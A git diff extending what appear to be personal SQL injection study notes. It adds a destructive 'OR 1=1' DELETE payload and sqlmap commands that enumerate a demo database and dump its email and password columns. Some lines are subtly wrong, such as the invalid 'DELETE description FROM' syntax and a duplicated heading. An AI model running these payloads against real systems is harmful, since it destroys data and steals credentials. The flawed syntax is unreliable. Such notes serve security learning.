@@ -34,6 +34,8 @@ SELECT Name, Description FROM Products WHERE ID='1'--
 ##### Common Locations To Check For SQLi
 > Check places that take users input like Cookies, User-Agent, Accept-Language, GET, POST params, etc.
 
+>Inject params with "'"  
+
 ##### Exploiting UNION BASED SQLi
 
 ```
@@ -50,4 +52,51 @@ id='UNION SELECT 'foo','bar';-- - >> Check reflected Field lets assume foo gets 
 ##### Quering User
 ```
 id='UNION SELECT user(), 'bar';-- - >> user@localhost
+```
+#### DELETE Statement 
+```
+DELETE description FROM items WHERE id=value
+
+DELETE description FROM items WHERE id='1' or '1'='1'; >> DELETE every thing 
+```
+
+##### Automating UNION Based Injection With SQLMAP
+```
+sqlmap -u "demo.site" -p search --technique=U -v3
+
+-v3 - Shows Payload Used by SQLMAP 
+```
+
+* --dbs > Enumerate database 
+
+```
+xyz
+information_schema
+```
+```
+sqlmap -u 'demo.local' --technique=U -D xyz --tables >> Queries tables for database name xyz
+```
+
+###### Output 
+```
+a
+b
+c
+d
+```
+
+##### Dump Columns
+```
+sqlmap -u 'demo.local' --technique=U -D xyz -T b --columns
+```
+
+###### Output 
+```
+email
+password
+```
+
+##### Dump Columns
+```
+sqlmap -u 'demo.local' --technique=U -D xyz -T b -C email,password --dump
 ```
